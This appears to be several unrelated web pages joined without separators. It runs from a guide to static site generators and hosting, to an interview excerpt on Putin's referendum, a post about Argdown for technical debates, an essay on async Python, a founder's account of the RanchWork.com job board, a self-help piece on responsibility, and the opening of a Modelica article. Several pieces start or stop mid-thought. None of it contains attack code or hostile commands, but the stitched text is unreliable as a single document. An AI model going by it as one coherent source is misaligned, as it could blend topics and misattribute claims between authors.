<h5 id="x-cool-kid-framework">X Cool Kid Framework</h5>
<p>You are on your own.</p>

<p>Perhaps you are more concerned with creating a blog and how a framework's authoring experience works than what technology powers the rendering of html. X JS forward frameworks tend to require a lot more configuration than those made specifically for creating a simple site. If this is your situation, you are in luck. There are tons of options and they are all fantastic for this purpose. I will go more in depth on some of these options since they are more tailored for a small perosnal site.</p>
<h5 id="jekyll">Jekyll</h5>
<p><a href="https://jekyllrb.com/">Jekyll</a> is the one of the oldest static site generators that made authoring a top concern with its use of Markdown. Built in 2008 by Tom Preston-Werner, Jekyll was part of the Rails era of web development where developer productivity was considered paramount to everything else. Jekyll is still very popular but is a bit of a non starter for many because it is built in Ruby. Still a great choice for a developer blog but you will have to use RubyGems instead of NPM.</p>
<h5 id="hugo">Hugo</h5>
<p><a href="https://gohugo.io/">Hugo</a> is a more modren framework than Jekyll. It tries to solve more problems out of the box than Jekyll, is more flexible, and considers the speed at which it creates pages to be a top concern. Part of Hugo's popularity comes from the fact that it is written in Go. This contributes to its speed but also contributes to some of the annoying aspects about it. Go is an interesting language but most of us don't have the opportunity to use it in our work. It is therefore best for those who love Go and don't mind using Go's templating libraries. You will also have to give up NPM if you choose Hugo.</p>
<h5 id="eleventy">Eleventy</h5>
<p>One of the newest kids on the block, <a href="https://www.11ty.dev/">Eleventy</a> is somewhere inbetween Hugo and Jekyll. It's focus is on flexibility and speed. It is super modular so it does take a little bit more time to get setup but for those looking for flexiblity, Eleventy has it in spades. It supports 11 templating language and best of all, it is a node library so you can use NPM for your entire project. This may be my personal choice if I were creating a new blog.</p>
<h2 id="other-concerns">Other Concerns</h2>
<h4 id="3-static">3) Static????</h4>
<p>Yes. In 2020 there is no reason to choose a framework that does not support static generation of pages for a small personal website. Every framework listed above supports static generation. If you need to be convinced of the power of static websites, checkout <a href="https://jamstack.org/">jamstack.org</a> which does a good job of going into all the benifits.</p>
<h4 id="4-hosting">4) Hosting</h4>
<p>As long as we have made the decision to use static generation, hosting is quite easy. There are still a lot of options however. Here are some of the top options and some of the thinking for when to use them.</p>
<h5 id="netlify">Netlify</h5>
<p><a href="https://www.netlify.com/">Netlify</a> is the hosting platform behind the <a href="https://jamstack.org/">JAMStack</a> movement. Founded in 2014, Netlify has grown rather quickly and has become the defacto hosting platform for static sites. With Netlify you can host static sites, deploy lambdas, and create git based workflows with extreme ease. I would recommend Netlify above all other options for a personal site.</p>
<h5 id="vercel-previously-zeit">Vercel (Previously Zeit)</h5>
<p><a href="https://vercel.com/">Vercel</a> is a very similar hosting platform as Netlify. Founded in 2015, Vercel boasts a fully featured platform for hosting static sites including git workflows and lambdas. I have used Vercel for years and I can recommend it. Vercel is a solid choice but I would recommend Netlify above Vercel for a fully featured static hosting platform.</p>
<h5 id="github-pages">Github Pages</h5>
<p><a href="https://pages.github.com/">Github pages</a> is quite an old option in the space of static website hosting. Launched in 2008 Github pages originally only supported Jekyll and static files but now supports other frameworks through some configuration. Github pages was once unique in that it automatically was integreted into your github account but this is now a common feature with the likes of Netlify and Vercel. Github pages is underpowered at this point but will always be free. If you want to host something simple and never think about it again, Github pages may be just the right choice.</p>
<h5 id="firebase">Firebase</h5>
<p><a href="https://firebase.google.com/">Firebase</a> is a platform as a service hosting provider that has some seriously robust features and is backed by Google. Firebase is not a static website hosting provider and aims to solve much more complicated issues around creating and hosting a sophisticated web application. The only reason you would want to choose Firebase is if you wanted authentication for some reason. Firebase allows for simple authentication and storage via it's flagship features <a href="https://firebase.google.com/products/auth">Firebase Authentication</a> and Firebase <a href="https://firebase.google.com/products/realtime-database">Realtime Database</a>. Firebase may also be a good option if you want to play with server tech but don't want to go too deep into the subject.</p>
<h5 id="heroku">Heroku</h5>
<p><a href="https://www.heroku.com/">Heroku</a> lit the world of application hosting on fire in 2007 when it made hosting a <a href="https://rubyonrails.org/">Ruby on Rails</a> application as simple as a couple of key strokes using the Heroku CLI. Like Firebase, Heroku aims to solve much more complex problems than a simple static website but is a great system for those who like to tinker with their backend. Heroku is for those who need to solve more complicated problems like storage or authentication, but want to do it with open source software instead of google invented technologies. If you are building a personal site to learn server tech, Heroku is a great option.</p>
<h4 id="5-apis">5) APIs</h4>
<p>Assuming you went with one of the hosting platforms specifically designed for simple static websites, you may be wondering "But what if I need a server for X". You are in luck, there is a great resource created by <a href="https://chriscoyier.net/">Chris Coyer</a>, of <a href="https://css-tricks.com/">CSS Tricks</a> and <a href="https://codepen.io/">Codepen</a> fame, that lists services that are great for static websites without a server, <a href="https://serverless.css-tricks.com/services/major">https://serverless.css-tricks.com/services/major</a>. <a href="http://formcake.com/">Formcake</a> also perfectly solves the problem of how to create a contact form on a static website. Formcake is committed to always having a useful free tier for developers with small projects. Consider checking it out the next time you tackle building your personal site.</p>

Here's part of their conversation.</p>  <p><strong>Is there any doubt about the outcome of this referendum?</strong></p>  <p>There is no doubt. Putin is 100-per-cent&nbsp;risk-averse. He only does things in advance, when he knows the outcome.</p>  <p>That outcome is that the presidency will be effectively extended into perpetuity for him. It may not say that exactly on the documents, but that's the intention.</p>  <p>And then when he runs for president — which will also be a predetermined outcome — he'll then be re-elected and will serve as president for life.</p>    <p><strong>And yet this government is so desperate to secure a high voter turnout in order to lend more legitimacy to this referendum. Why is that so important to Putin, if he's got it all sewn up anyway?</strong></p>  <p>Well, what does he have sewn up? He can cheat —&nbsp;change the numbers if he wants. He controls the television stations. He can put pressure on people.</p>  <p>But people do have to vote in a referendum, and if the outcome is so dramatically different — or if people think that the outcome is so dramatically different — than what they intended to do, people could rise up.</p>  <p>That's his fear.

    <p>People are amazing creatures. When discussing a complex issue, they are able to keep multiple independent
arguments in their heads, the pieces of supporting and disproving evidence, and can collapse this system
into a concrete solution. We can spend hours navigating through the issue comments on Github, reconstructing
the points of view, and making sense of the discussion. Problem is: we don’t actually want to apply this
superpower and waste time nearly as often.</p>

<h2 id="problem-with-technical-discussions">Problem with technical discussions</h2>

<p>Have you heard of <code>async</code> in Rust? Ever wondered why the core team opted into a completely new syntax for this feature? Let’s dive in and find out! Here is <a href="https://github.com/rust-lang/rust/issues/57640">#57640</a> with 512 comments, kindly asking everyone to check <a href="https://github.com/rust-lang/rust/issues/50547">#50547</a> (with just 308 comments) before expressing their point of view. Following this discussion must have been exhausting. I don’t know how it would be possible to navigate it without the <a href="https://github.com/rust-lang/rust/issues/57640#issuecomment-456624074">summary</a> <a href="https://github.com/rust-lang/rust/issues/57640#issuecomment-456625030">comments</a>.</p>

<p>Another example is the loop syntax in WebGPU. Issue <a href="https://github.com/gpuweb/gpuweb/issues/569">#569</a> has only 70 comments, with multiple attempts to <a href="https://github.com/gpuweb/gpuweb/issues/569#issuecomment-610041440">summarize</a> the discussion in the middle. It would probably take a few hours at the minimum to get a gist of the group reasoning for somebody from the outside. And that doesn’t include the call transcripts.</p>

<p>Github has emojis which allow certain comments to show more support. Unfortunately, our nature is such that comments are getting liked when we agree with them, not when they advance the discussion in a constructive way. They are all over the place and don’t really help.</p>

<p>What would help though is having a non-linear structure for the discussion. Trees! They make following HN and Reddit threads much easier, but they too have problems. Sometimes, a really important comment is buried deep in one of the branches. Plus, trees don’t work well for a dialog, when there is some back-and-forth between people.</p>

<p>That brings us to the point: most technical discussions are <em>terrible</em>. Not in a sense that people can’t make good points and progress through it, but rather that there is no structure to a discussion, and it’s too hard to follow. What I see in reality is a lot of focus from a very few dedicated people, and delegation by the other ones to those focused. Many views get misrepresented, and many perspectives never heard, because the flow of comments quickly filters out most potential participants.</p>

<h2 id="structured-discussion">Structured discussion</h2>

<p>My first stop in the search of a solution was on <a href="https://www.discourse.org/">Discourse</a>. It is successfully used by many communities, including <a href="https://users.rust-lang.org/">Rust users</a>. Unfortunately, it still has linear structure, and doesn’t bring a lot to the table on top of Github. Try following <a href="https://users.rust-lang.org/t/rust-2020-growth/34956">this discussion
</a> about Rust in 2020 for example.</p>

<p>Then I looked at platforms designed specifically for a structured argumentation. One of the most popular today is <a href="https://www.kialo.com/">Kialo</a>. I haven’t done a good evaluation on it, but it seemed that Kialo isn’t targeted at engineers, and it’s a platform that we’d have to register in for use. Wishing to use Markdown with a system like that, I stumbled upon <a href="https://argdown.org/">Argdown</a>, and realized that it concluded my search.</p>

<p>Argdown introduces a syntax for defining the structure of an argument in text. Statements, arguments, propositions, conclusions - it has it all, written simply in your text editor (especially if its VSCode, for which there is a plugin), or in the <a href="https://argdown.org/sandbox/html">playground</a>. It has command-line tools to produce all sorts of derivatives, like dot graphs, web components, JSON, you name it, from an <code>.argdown</code> file. Naturally, formatting with Markdown in it is also supported.</p>

<p>That discovery led me to two questions. (1) - what would an <em>existing</em> debate look like in such a system? And (2) - how could we shift the workflow towards using one?</p>

<p>So I picked the most contentious topic in WebGPU discussions and tried to reconstruct it. Topic was about choosing the shading language, and why SPIR-V wasn’t accepted. It was discussed by the W3C group over the course of 2+ years, and it’s evident that there is <a href="https://github.com/gpuweb/gpuweb/issues/847#issuecomment-642497578">some</a> <a href="https://news.ycombinator.com/item?id=23089745">misunderstanding</a> of why the decision was made to go with WGSL, taking Google’s Tint proposal as a starting point.</p>

<p>I attempted to reconstruct the debate in https://github.com/kvark/webgpu-debate, building the <a href="https://github.com/kvark/webgpu-debate/blob/b28252ea99aef8989858ece09f74dc0758e3d46c/arguments/SPIR-V.argdown">SPIR-V.argdown</a> with the first version of the argumentation graph, solving (1). The repository accepts pull requests that are checked by CI for syntax correctness, inviting everyone to collaborate, solving (2). Moreover, the artifacts are automatically uploaded to Github-pages, rendering the <a href="https://kvark.github.io/webgpu-debate/SPIR-V.component.html">discussion</a> in a way that is easy to explore.</p>

<h2 id="way-forward">Way forward</h2>

<p>I’m excited to have this new way of preserving and growing the structure of a technical debate. We can keep using the code hosting platforms, and arguing on the issues and PR, while solidifying the core points in these <code>.argdown</code> files. I hope to see it applied more widely to the workflows of technical working groups.</p>

    <p><br>
I’ve been thinking about writing this article for a bit, but have been most prompted by a post grandly titled “<a href="http://calpaterson.com/async-python-is-not-faster.html">Async Python is not faster</a>”. The post was rooted with some good motivations and observations, but also fell somewhat into a polarising mode of discussion that I’d like to see our communities try to move beyond.</p>

<p>Async concurrency necessarily brings with it an element of ecosystem split, and this can mean that it’s a bit of a divisive area to try to have conversations within.</p>

<p>However I think we could probably benefit from a bit more recognition of where there is shared ground. And in areas where there’s less clarity, to be able to have constructive conversations around the relative merits in differing approaches.</p>

<hr>



<h3 id="-why-you-shouldnt-care-about-performance">★ Why you shouldn’t care about “performance”.</h3>

<p>If you’re starting a new project, and choosing a python async framework vs a python sync framework, then any “performance” metrics around the frameworks <em>almost certainly don’t actually matter</em>, and are almost always a nonsense point of debate.</p>

<p>What is <em>actually</em> critical to your business is the development experience and strength of the surrounding ecosystem. What is your time to market going to be? How will the maintenance overhead be? How robust and evolvable is your codebase?</p>

<h3 id="-why-you-might-care-about-performance">★ Why you might care about “performance”.</h3>

<p>Having said that, there <em>are</em> a small portion of cases where the performance characteristics are a valid consideration. Particularly if your web framework makes lots of outgoing HTTP requests or other networking and I/O.</p>

<p>It’s important for the Python ecosystem that it ought to compare favourably to other dynamic languages in domains where async is beneficial. We don’t want to be in a position where “we’re using JavaScript because we believe it’ll scale up better” is a valid market blocker vs. choosing Python.</p>

<h3 id="-what-were-talking-about-when-we-talk-about-performance">★ What we’re talking about when we talk about “performance”.</h3>

<p>Like-for-like a single async function call in isolation will be marginally slower than a plain function call. That’s not contentious.</p>

<p>What we’re actually interested in is how <em>efficiently</em> we can interleave multiple concurrent tasks. In I/O bound systems co-operative concurrency (async) performs more efficiently under high concurrency than threaded concurrency (sync). Again, not contentious.</p>

<p>Again - Async Python is not faster. It <em>is</em> more efficient. Which will <em>tend</em> to mean that on I/O bound systems, the latency will <em>continue</em> to remain low even as the level of concurrency increases.</p>

<h3 id="-there-are-no-good-benchmarks">★ There are no good benchmarks.</h3>

<p>JSON “hello world” benchmarks are junk. Almost all cases of “I’ve created this benchmark myself” are likely to be junk. The prevalence of new frameworks overly focusing on nebulous benchmarking claims is generally junk. An obsession on benchmarking numbers can also sometimes result in poor overall design choices, such as obfuscated or unnecessarily coupled bits of codebase, because some not-very-meaningful metric is being prioritised over the code design itself. None of this should be contentious.</p>

<p>It’s not <em>always</em> true, for example, when Sanic was introduced there was a genuine step forward which was worth talking about, so I can understand why there was a focus there. But there’s still a ridiculous hype-cycle attached as a result, and we need to be really careful about trying to step beyond that.</p>

<p>It’s also reasonable if benchmarking is discussed in a sensible context and placement. For example, to the extent that Uvicorn and Starlette have discussed performance it has only ever been with a view to making a solid case that having a <em>properly specified</em> server/framework boundary API isn’t a negative performance consideration. Prior to the introduction of ASGI, Python’s async web ecosystem had generally bundled together both the low-level HTTP handling and the high level framework, and there was a notion that needed dispelling that introducing a properly specified separation of concerns wasn’t a good approach because <em>“something something performance something”</em>.</p>

<p>If you <em>are</em> going to look at web framework benchmarks for some very rough first-pass ideas about relative efficiency then the TechEmpower benchmarks should almost certainly be your baseline, since they’re at least independent, and have a decent range of test cases. If you’re going to diverge from them have some good argument for doing so.</p>

<p>The “Async Python is not faster” benchmarking is a reasonable example here, since it had clearly applied a decent degree of thoughtfulness. Even so there were still problems with the methodology, as <a href="https://twitter.com/llanga/status/1271719778324025349">Łukasz Langa did a good job of unpicking</a>.</p>

<p>Having said that, the TechEmpower benchmarks only show throughput, and don’t include any <em>meaningful</em> latency information. There’s actually a good reason for that, since
comparing latencies is really difficult. You can’t arrive at a single “95% latency” figure, because the figure you’ll arrive at <em>also depends on what throughput load you’re putting the system under</em> at the time of measuring the latency.</p>

<p>As a result measuring latency is only ever really meaningful if you’re looking at <em>graphs of how the latencies vary over a range of different throughputs</em>. Amber Brown’s <a href="https://www.youtube.com/watch?v=YxP1I-tm_2c">DjangoCon 2019 keynote talk does a fantastic job of showing some examples here</a>.</p>

<h3 id="-asgi-is-a-really-positive-step-for-the-async-ecosystem">★ ASGI is a really positive step for the async ecosystem.</h3>

<p>Having a decently specified server/framework interface is a <em>really good thing</em>. Andrew Godwin’s design for ASGI fills this gap with a WSGI-like approach. That has a set of trade-offs, but it’s a pretty pragmatic and well rounded choice.</p>

<p>This should not really be contentious.</p>

<h3 id="-its-about-functionality">★ It’s about functionality.</h3>

<p>Async isn’t just about achieving higher levels of concurrency-per-server, it also makes it a bunch of new functionality more feasible, including…</p>

<ul>
  <li>Handling long-lived network connections like Websockets.</li>
  <li>Long-lived HTTP connections and server sent events.</li>
  <li>Dealing with background tasks without necessarily needing a full blown task queue subcomponent.</li>
  <li>Parallelizing outgoing HTTP requests or other high latency I/O.</li>
</ul>

<h3 id="-not-everything-is-perfect">★ Not everything is perfect.</h3>

<p>The async ecosystem is far more immature than the existing thread synchronous. There are different challenges there, such as ensuring that <a href="https://lucumr.pocoo.org/2020/1/1/async-pressure/">backpressure is handled consistently throughout the various async APIs</a>, or in <a href="https://vorpus.org/blog/notes-on-structured-concurrency-or-go-statement-considered-harmful/">applying the lessons of structured concurrency</a>.</p>

<p>Nor is the “stdlib asyncio isn’t perfect” line a good argument either against asyncio specifically, or against async/await in general.</p>

<p>It’s okay that there’s still work to do in places. We know.  Let’s get that work done.</p>

<h3 id="-async-is-harder">★ Async is harder.</h3>

<p>Having to <em>think</em> about if a function does or doesn’t make I/O or could otherwise block <em>is unarguably more complex than not having to think about it</em>. It’s also more precise - you’re having to think about that for a reason, and done properly it’s presenting you with more information as a result. Being able to reason more clearly about which parts of your framework stack do or don’t perform I/O has a cost but also brings benefits.</p>

<p>There’s an analogy to make there in that writing Python using explicitly enforced typing is likely to be a harder than writing Python in an untyped style. It’s harder because you’re <em>also being more precise</em>. That’s not necessarily either good or bad, but it is definitively <em>different</em>.</p>

<p>This also gets to the point about why the “<a href="https://journal.stuffwithstuff.com/2015/02/01/what-color-is-your-function/">What colour is your function</a>” argument isn’t actually a good case against async code, even if it seems to make clear sense on first pass. We’re coloring our functions because we’re <em>enforcing the exposure of some important information all the way throughout the stack</em>. That’s not an inherently bad thing to do.</p>

<hr>



<p>If those are areas where I think we ought to be able to reach consensus on, then there’s also a few areas where I think that the possible outcomes are less clear…</p>

<h3 id="-you-take-the-high-road-and-ill-take-the-low-road">★ You take the high road, and I’ll take the low road.</h3>

<p>There’s a few different tacks we might take onto introducing async into the Python web framework ecosystem…</p>

<ul>
  <li>Promoting mostly staying with threaded web frameworks. There’s actually a perfectly decent case to make that Python <em>on the whole</em> should eschew a <em>wide move towards async</em>. That the drawbacks of moving large swathes of the ecosystem towards an async model outweigh the advantages. (Pros: Simpler for the end developer. Huge existing ecosystem.)</li>
  <li>Working towards blended approaches. This is being championed within the Django community which is incrementally adding async support, largely off the back of some Herculean work by Andrew Godwin and others. This approach can either be in the form of adding support for async at the server level, while keeping the framework level strictly thread-synchronous. Or it can gradually start to expose optional async capabilities all the way through the stack. (Pros: Brings along the existing ecosystem, while adding async capabilities when they’re needed.)</li>
  <li>Working towards async-native frameworks. (Pros: Lower overall complexity of the stack then blended approach. More efficient since there’s less overhead in marshalling between two style all the way through the stack. If we’re having to write large amounts of new code then it’s not a bad inflection point at which to also rethink and finesse other aspects of how we’re putting together new frameworks.)</li>
</ul>

<p>We can’t really say which of these will yield the best dividends. Personally I <em>happen</em> to be working in the last of those three slices, simply because I can see a bunch of areas where I can contribute meaningfully towards the ecosystem there.</p>

<h3 id="-positioning-asyncio-and-trio">★ Positioning asyncio and Trio</h3>

<p>There another big question mark over the relative positioning of asyncio and Trio in the ecosystem. Trio is a newer approach to a Python async framework, that’s meticulously designed, and based on the principles of structured concurrency, that have been outlined by it’s author, Nathaniel Smith.</p>

<p>The difficulty this brings is that Trio is necessarily incompatible with asyncio, and introduces an ecosystem-split within an ecosystem-split.</p>

<p>There’s a few different …</p></div></div>

Not names he owned and parked, but domains he owned &amp; developed. This was another early project of his – a job board solely focused on the ranching industry. All aspects – cattle, outfitters, dude/guest, hunting, and even associated businesses like horseback riding. He’d launched it in 1998, and done an admirable job developing the brand and building an audience. But other projects had hijacked his attention, and the site had become a bit stale. Its revenue had evaporated.</p>
<p>I knew David from a partnership between DudeRanch.com (mine, at the time) &amp; GuestRanches.com (his). We had grouped them together to sell advertising. A handshake deal. Stronger together, we assumed. And we were right. Over the years, we were able to (more than) double revenue by leveraging the authority of our sites as one entity, versus two.</p>
<p>The more we worked together, the more we shared business opportunities with one another. At one point he shared his portfolio with me, <em>and that’s when I discovered <a href="https://www.ranchwork.com/" rel="noopener noreferrer" target="_blank">RanchWork.com</a></em> .</p>
<p>At that time, I’d been poking around for a second project to develop, and came up empty after a year or so of searching. My usual avenue for acquisition, the <a href="https://www.deepsouthventures.com/build-a-side-business/" target="_blank" rel="noopener noreferrer">expiring domain name market</a>, hadn’t yielded anything of value, so my wandering mind lead me to David.</p>
<p>When I uncovered RanchWork, it reminded me of a friend – <a href="http://shanepike.com/" rel="noopener noreferrer" target="_blank">Shane Pike</a> – who’d built, developed, and successfully sold a nursing job board several years before. And from what I remember, he did it solo. The straightforward nature of job boards was attractive – direct, simple, &amp; sans-fluff.</p>
<p>The niche was compelling, so after I slept on it, I pinged David. To see if he’d let me test a project on it. I was already deeply entrenched in the dude ranching industry, so it seemed like a natural extension. The rough idea was this:</p>
<ol>
<li>Point the RanchWork.com nameservers to me, and I’ll cover the costs of re-development, plus oversight &amp; maintenance.</li>
<li>Once developed, I’d allow <em>free</em> job listings for ranchers to encourage a regular stream of postings. </li>
<li>I’d also allow <em>paid</em> listings (which would post at a faster clip, and remain active for a longer period. </li>
<li>To ensure simplicity, I’d avoid any type of login or account creation. If a rancher was hiring, they’d simply fill out a form, enter credit card info (if needed), and submit. Done deal.</li>
<li>David would receive 25% of all job board revenue the site collected; the remaining 75% would fall into my pocket. Ad publisher revenue was also under my wing.</li>
<li>David would continue to own the domain, 100%, outright.</li>
</ol>
<p>What makes it easy (&amp; fun) to work with David is his ‘<em>screw it, let’s do it</em>‘ attitude. I very much admire that about him, as I tend to follow the same outlook on life. And he brought that spirit into this project as well.</p>
<p>So he agreed. And I got to work.</p>
<figure id="attachment_1309" aria-describedby="caption-attachment-1309"><img src="https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-464x700.jpg" alt="David McCollough &amp; Peter Askew" width="464" height="700" srcset="https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-464x700.jpg 464w, https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-199x300.jpg 199w, https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1.jpg 477w" sizes="(max-width: 464px) 100vw, 464px"><figcaption id="caption-attachment-1309">David McCollough &amp; Peter Askew (the tall idiot)</figcaption></figure>
<p><em>Now, sure, from the outset, I could have viewed this idea from a defeatist attitude, that being, “What? I’m gonna try to compete with Indeed, SimplyHired, Monster, and the like? They’re VC backed heavyweights… I have no chance.”</em></p>
<p>I rarely approach projects from this mindset. I tend to approach them from the perspective, “what do I have to lose”. And usually, the answer is  “not much”. And then that thought morphs into “let’s see what kinda shit I can stir up”.</p>
<p>So to start, I purchased a $60 job board theme, and took a full week to properly architect the site for mobile devices and seo. I researched competitors. $25 seemed like the average rate for paid job postings, so that became my base price. Another close friend, <a href="https://www.workinsports.com/blog.asp" target="_blank" rel="noopener noreferrer">Brian Clapp</a>, suggested I add a ‘Job Wanted’ listing for folks searching for ranch employment. I was skeptical that need existed, but added it anyway. And then I happily overpaid for the fastest, most reliable WordPress host I could find. </p>
<p>Essentially, the site changed from this:</p>

<p>An improvement, I thought. Not perfect, but better. Simpler in a way. </p>
<p>I re-launched the site in October of 2013.</p>
<p>At first, I seeded all the jobs myself. Then ranchers started submitting their own. Then I shifted into curation &amp; verification. </p>
<p>Then, over the next 7 years, site traffic did this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats.png" alt="" width="700" height="158" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats.png 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats-300x68.png 300w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>From virtually zero traffic, the site ramped up to roughly 40k-50k visitors a month. Typically 200,000 pageviews every 30 days. I had to start managing overage fees with my hosting provider.</p>
<p>Jobs of all types started pouring in. </p>
<p>As the sole curator, I made sure they followed the singular track I defined. And overall, they did.</p>
<p>Jobs like this, where you <a href="https://www.ranchwork.com/job/packers-trail-guides-maintenance-crew-needed-at-grand-canyon-az/" rel="noopener noreferrer" target="_blank">had to ride a mule to &amp; from your work location</a> at the Grand Canyon.</p>
<p>Or this one, for a <a href="https://www.ranchwork.com/job/mountain-permit-rider-needed-at-wyoming-cattle-ranch/" rel="noopener noreferrer" target="_blank">Mountain Permit Rider</a>, responsible for all for all aspects of yearling cattle care &amp; management in private ranch pastures and mountain forest grazing allotments near Cody, Wyoming. </p>
<p>Or this Job Wanted from 2017, an <a href="https://www.ranchwork.com/job/position-wanted-ranch-hand-91817/" rel="noopener noreferrer" target="_blank">individual looking for work in the Cave Creek / Scottsdale, Arizona area</a>.</p>
<p>Job posting pictures were equally as endearing. All user submitted. Pics like this:</p>

<p>The more jobs (and job wanted) postings we listed, the more positive feedback we’d receive. That we were a great help for a remote ranch with limited hiring resources. That they were in financial straits, and our Free offering allowed them to hire the right Manager to turn their operation around. <em>And the avenue I was most skeptical about</em> – Job Wanted postings – wound up assisting individuals who craved an escape from the city into life on a working ranch (as well as contributing 30% of our overall revenue). &gt;&gt; <em>gracias, Mr. Clapp</em></p>
<p>The feeling was familiar. It felt like my <a href="https://www.deepsouthventures.com/i-sell-onions-on-the-internet/" target="_blank" rel="noopener noreferrer">Vidalia</a> project. That I was making a positive impact. Satisfying a unique pain point, subtly, as a solo operator.</p>
<p>This project – originally a passing glance – became my mini workhorse. And such a proud production that I wound up buying the whole project from David in 2017. I doubled down in 2019 by investing $10k into a fancier backend and refreshed design. The site deserved that – a proper identity.</p>

<p>I tend to approach online businesses this way. Not intentionally – I just found myself on this path. Find a good domain name; build a product/service; see if it solves a problem &amp; makes people happy; <strong>*and only then*</strong> attempt to make it profitable. Purpose always comes first. As does contentment. Revenue always comes second. Sure, this approach has bitten me in the ass before, but I don’t care. When it’s worked, the results are wondrous. And this project checked those boxes.</p>
<p>And while RanchWork.com isn’t a flashy VC funded endeavor, or even some high flying 6-figure revenue generator, it’s not that I don’t care. The <em>site</em> doesn’t care. Cause it’s too busy. Working. Quietly. </p>
<p>My Twitter friend <a href="https://ian.is/" rel="noopener noreferrer" target="_blank">Ian Nuttall</a> identifies these types of projects aptly; as nice, <em>humble</em> internet businesses. </p>
<p>I like humble internet businesses … </p>
<p>… and I’m quite proud to be this job board’s proprietor.</p>

<hr>
<h2>post script</h2>
<p>I knew I was in a pickle. </p>
<p>While I owned and operated RanchWork.com, I didn’t own the .com name of this niche industry. That being <em>RanchJobs.com</em>. It was owned by a 3rd party, and undeveloped.</p>
<p>That didn’t sit well with me.</p>
<p>So in 2018, I reached out to the owner. I got lucky, in that – – he responded. We had mutual friends, so that helped. The email:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1.png" alt="" width="700" height="445" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1.png 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1-300x191.png 300w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>He was aware of my RanchWork project, and the price point reflected that. And he wouldn’t go lower. I couldn’t wrap my head around the price, so I shelved it. </p>
<p>Until 2020, two years later. When COVID-19 hit. The financial world went sideways. I was a bit frazzled as well. This domain name bubbled up into my brain, though. That this might be an opportunity.</p>
<p>So I leveraged a 3rd party domain marketplace platform where I could remain somewhat anonymous. I submitted an offer of $2,500.</p>
<p>They countered at $9,999. </p>
<p>I didn’t respond.</p>
<p>A broker from the marketplace called. Nice guy. He probed like a domain broker should do. He asked if they got down to $5k, if it’d be a range we’d consider. I wasn’t sure.</p>
<p>They brought the $5k offer to the table. </p>
<p>I understood I was in a halo of time where this price could disappear as quickly as it appeared, so I went ahead &amp; accepted it.</p>
<p>I wanted that chess piece off the board, essentially. Another barrier to entry. </p>
<p>It’s fun to see how many times this domain is typed into a browser, though (238 times per month, tracked via re-direct). If I look at it from an advertising perspective, &amp; apply a $0.50 <a href="https://en.wikipedia.org/wiki/Pay-per-click" rel="noopener noreferrer" target="_blank">CPC</a> to each visit, this domain should pay for itself by 2023. 🤠</p>
<p>I’m so fortunate the internet exists.</p>

                <section>
                    <div>
                        <h2 id="you-are-100-responsible-for-everything-i-mean-everything-"><strong>You are 100% responsible for everything. I mean everything.</strong></h2><p>At least that's how you should live your life.</p><p>You're at work, and something happens–a colleague didn't do what they were supposed to one time. Your jerk boss decides last minute to blame you for something that you raised concerns about a month ago. Your spouse is oblivious to what you've been doing around the house and yells at you for not doing the dishes. <em>Again</em>. And yes, I know, you did them all last night.</p><p>But you are responsible.</p><p>I've always struggled with this. It seems unfair, almost unjust. Why should I take responsibility for something that is clearly, utterly, and completely is beyond my control? Why should "they" get away with it? If I take responsibility, aren't I enabling and reinforcing that bad behavior?</p><p>Actually, no.</p><p>The book, <em>The Subtle Art of Not Giving a F*ck,</em> finally helped me understand. Responsibility and fault ARE NOT the same. It's not your fault that the deadline was missed but you ARE responsible for what you're going to do about it.</p><p>And hell, maybe you do nothing. Maybe that's the best choice. But you are <strong>responsible</strong>.</p><blockquote>See, things happen. Whether it's people, nature, or God, shit happens. This is a universal truth and we cannot escape it. Some of the things that happen are good, some are bad. Some are preventable or in our control. Others aren't. And frankly, none of that matters.</blockquote><p>Things happen and then it's up to you to decide how you want to respond. Responsibility is not about taking the blame, it's about taking control. If you realize that you are responsible, then you can act. And when we act, we can be authors of our own fate. Or at least try.</p><p>Too often we blame others. So much breath is wasted blaming, arguing about who's right, who's wrong, and what "they" should do.</p><p>But you can't control them, you can only control you. So respond. Take action to make whatever outcome you want to happen, happen. Or at least a more likely outcome.</p><p>Take control over your feelings. Yes, those things that try to control us and come out of nowhere.</p><blockquote>Impossible? No. Difficult? Yes.</blockquote><p>Be responsible for how you feel. Be responsible for how you act. Your reaction is up to you. "Re" and "act" meaning, your action that happens in response to a stimulus.</p><p>Because you got angry when someone cut you off does not mean that you have to speed up and flick them off. You will have impulses, and that's fine. But your "re-action" is under your control.</p><p>The blood flowing to your limbic system, reducing your ability to think clear does not make you a monkey. You can still think. You can still breath. Talk yourself off the emotional, reactive ledge, and think.</p><p>That magical tool of cognition that humanity &nbsp;has developed. Thinking. Think about what your reaction is going to be. Be responsible for your action.</p><p>Responsibility is painful. It's shitty, frustrating, and requires extra effort. But as you realize that you're in more control than you think, other things begin to happen as well. You are no longer controlled by others.</p><p>Or at least less so. You may be fired. It might not be your fault. And bitching about it for a month is justifiable. And it would feel oh sooooo good.</p><p>But, your response is your choice. You can respond with bitching, or you can respond with gritting your teeth and looking for new jobs.</p><p>Either way, the choice is yours.</p>

      <h2>All about Modelica</h2>
      <p>
	by <b>Marco Bonvini</b> on Monday June 29, 2020
      </p>
    <p>Early in my career, when ML and AI weren’t as cool, I fell in love with modeling and simulations.
As Joel Spolsky recently <a href="https://www.joelonsoftware.com/2020/06/18/hash-a-free-online-platform-for-modeling-the-world/">put it</a>,
sometimes you’re working on something that’s just too complicated to reason about with simple math, you can’t even begin to guess
how the inputs affect the outputs. In such cases, simulation models will help you understand better complex problems.<!--more--></p>

<p>While working with modeling and simulations, I discovered Modelica, a language for developing simulation models.
I worked <a href="https://marcobonvini.com/research">extensively</a> with Modelica, both during my Ph.D. as well as
in my first job at <a href="https://eta.lbl.gov/">Lawrence Berkeley National Laboratory</a>.
